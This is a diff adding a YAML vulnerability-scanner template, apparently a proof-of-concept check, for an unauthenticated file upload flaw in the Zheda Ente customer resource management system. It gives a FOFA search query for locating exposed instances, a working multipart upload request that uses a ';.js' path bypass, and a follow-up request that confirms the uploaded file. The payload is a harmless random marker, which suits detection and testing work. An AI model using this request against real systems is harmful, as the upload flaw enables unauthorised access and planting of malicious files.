@@ -1,0 +1,36 @@
+id: poc-yaml-zhe-da-en-te-customer-resource-management-system-mailaction-file-upload
+info:
+  name: 浙大恩特客户资源管理系统 MailAction 文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 浙大恩特客户资源管理系统
+  fofa: title="欢迎使用浙大恩特客户资源管理系统"
+variables:
+  t1: random_str(4)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /entsoft/MailAction.entphone;.js?act=saveAttaFile
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+      like Gecko) Chrome/116.0.5845.111 Safari/537.36
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqO6sfIPwABq9ApjJ
+  data: '------WebKitFormBoundaryqO6sfIPwABq9ApjJ
+
+    Content-Disposition: form-data; name="file";filename="{{.t1}}.txt"
+
+    Content-Type: xxx/txt
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryqO6sfIPwABq9ApjJ--'
+  expression: status_code == 200 && contains(body,t1) && contains(body,"上传成功")
+  output:
+  - regex_match(body,"(?P<t3>[0-9]{25})")
+- method: GET
+  path: /enterdoc/EnterMail/20231120/{{.t3}}/{{.t1}}.txt
+  expression: status_code == 200 && body == t2
+transport: http
